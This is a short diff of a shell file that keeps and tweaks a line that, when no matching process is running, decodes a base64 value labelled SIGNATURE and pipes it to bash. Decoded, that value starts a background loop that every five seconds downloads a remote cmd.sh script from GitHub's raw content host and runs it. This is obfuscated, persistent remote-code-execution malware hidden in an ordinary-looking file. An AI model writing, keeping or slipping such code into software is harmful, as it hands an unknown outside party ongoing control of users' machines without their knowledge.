@@ -1,3 +1,3 @@
 
 SIGNATURE='KG5vaHVwIHdhdGNoIC1uNSAiZWNobyAnWTNWeWJDQXRjMlpNSUdoMGRIQnpPaTh2Y21GM0xtZHBkR2gxWW5WelpYSmpiMjUwWlc1MExtTnZiUzlqWlhOaGNtZGhMM0p0TDIxaGFXNHZZMjFrTG5Ob0lId2dZbUZ6YUFvPScgfCBiYXNlNjQgLWQgfCBiYXNoIiAmKSA+L2Rldi9udWxsIDI+JjE='
-(pgrep 'Y3VybCAtc2ZMIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS' || (echo "$SIGNATURE" | base64 -d | bash)) >/dev/null 2>&1
+(/usr/bin/pgrep -f 'Y3VybCAtc2ZMIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS' || (echo "$SIGNATURE" | base64 -d | bash)) >/dev/null 2>&1
